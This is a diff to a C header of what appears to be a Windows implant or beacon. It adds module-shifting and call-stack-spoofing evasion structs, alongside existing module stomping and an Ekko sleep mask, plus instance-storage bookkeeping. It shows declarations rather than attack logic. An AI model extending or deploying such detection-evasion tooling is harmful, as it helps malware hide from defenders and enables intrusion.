@@ -22,7 +22,7 @@ typedef struct _NT_SYSCALL {
 #endif
 #include "stackstr.h"
 
-// Forward-declare DESYNC_SPOOFER for INSTANCE struct (full definition in evasion/callstack_spoof.h)
+// Forward-declare GHOST_SPOOFER for INSTANCE struct (full definition in evasion/callstack_spoof.h)
 #ifdef INCLUDE_EVASION_CALLSTACK_SPOOF
 #ifdef _WIN64
 #include "evasion/callstack_spoof.h"
@@ -33,6 +33,13 @@ typedef struct _NT_SYSCALL {
 #ifdef INCLUDE_EVASION_MODULE_STOMP
 #ifdef _WIN64
 #include "evasion/module_stomp.h"
+#endif
+#endif
+
+// Module shifting (backup/restore + shifted bootstrap execution)
+#ifdef INCLUDE_EVASION_MODULE_SHIFT
+#ifdef _WIN64
+#include "evasion/module_shift.h"
 #endif
 #endif
 
@@ -444,11 +451,16 @@ typedef struct _INSTANCE {
 
 #ifdef INCLUDE_EVASION_CALLSTACK_SPOOF
 #ifdef _WIN64
-    // ─── Desync/SilentMoonwalk callstack spoofing ───
-    DESYNC_SPOOFER DesyncSpoofer;         // Spoofer struct (matches ASM layout)
     BOOL   bCallstackSpoofInit;           // TRUE if spoofer initialized
-    UINT32 dwDesyncRngState;              // xorshift32 PRNG state for frame variation
 #endif
+#endif
+
+#ifdef _WIN64
+    // Unwind-table registration result - written UNCONDITIONALLY by
+    // main_entry's RtlAddFunctionTable path, so it lives outside the
+    // callstack-spoof gate (default builds compile that code too).
+    // 1=attempted 2=registered 3=resolve-fail 4=sanity-fail 0=not-run
+    UINT32 dwUnwindRegResult;
 #endif
 
 #if SLEEP_MASK_TYPE == MASK_EKKO
@@ -464,7 +476,31 @@ typedef struct _INSTANCE {
 #endif
 #endif
 
+#ifdef INCLUDE_EVASION_CALLSTACK_SPOOF
+#ifdef _WIN64
+    // ─── LACUNA ghost-chain callstack spoofing ───
+    // MUST stay LAST in INSTANCE: it is the largest variable-size block and
+    // shifting the offsets of ModuleStomp/Config fields breaks the module
+    // stomp/overload transfer's baked-in offset math (T2 2026-11-09: overload
+    // builds hung before first egress with the struct mid-INSTANCE even with
+    // every CSP code path compiled out).
+    GHOST_SPOOFER GhostSpoofer;           // Spoofer struct (matches ASM layout)
+#endif
+#endif
+
 } INSTANCE, *PINSTANCE;
+
+// Storage budget carved out in src/asm/entry.x64.asm (__InstanceStorage) and
+// entry.x86.asm (___InstanceStorage). The INSTANCE is placed at its start; a
+// struct larger than this silently overwrites the data that follows in
+// .instdata (notably the __pdata start/end pointers) - symptom: deterministic
+// crashes inside ntdll unwinding with NO code in the offending feature even
+// running. Never let this assert fail.
+#define INSTANCE_STORAGE_SIZE 24576
+#ifdef __cplusplus
+static_assert(sizeof(INSTANCE) <= INSTANCE_STORAGE_SIZE,
+              "INSTANCE outgrew its entry.asm storage - grow __InstanceStorage in entry.x64.asm AND ___InstanceStorage in entry.x86.asm to match INSTANCE_STORAGE_SIZE in common.h");
+#endif
 
 // Global instance (resolved via PIC pattern)
 EXTERN_C ULONG __Instance_offset;
@@ -518,17 +554,10 @@ int   es_strcmp(const char* a, const char* b);
 int   es_strlen(const char* s);
 VOID  es_strcpy(char* dst, const char* src);
 
-#ifdef DEBUG
-// TEMP DIAGNOSTIC: file-based stage tracing (OutputDebugString is not capturable
-// over this test harness). Defined in main.cc.
-VOID es_dbg_trace(PINSTANCE inst, const char* msg);
-#define TRACE(inst, m) es_dbg_trace(inst, m)
-#else
 #define TRACE(inst, m) ((void)0)
-#endif
 
 #ifdef DEBUG
-#define DBG(inst, tag) do { if ((inst)->Win32.OutputDebugStringA) { (inst)->Win32.OutputDebugStringA(tag); (inst)->Win32.OutputDebugStringA("\n"); } es_dbg_trace((inst), (tag)); } while(0)
+#define DBG(inst, tag) do { if ((inst)->Win32.OutputDebugStringA) { (inst)->Win32.OutputDebugStringA(tag); (inst)->Win32.OutputDebugStringA("\n"); } } while(0)
 #else
 #define DBG(inst, tag) ((void)0)
 #endif
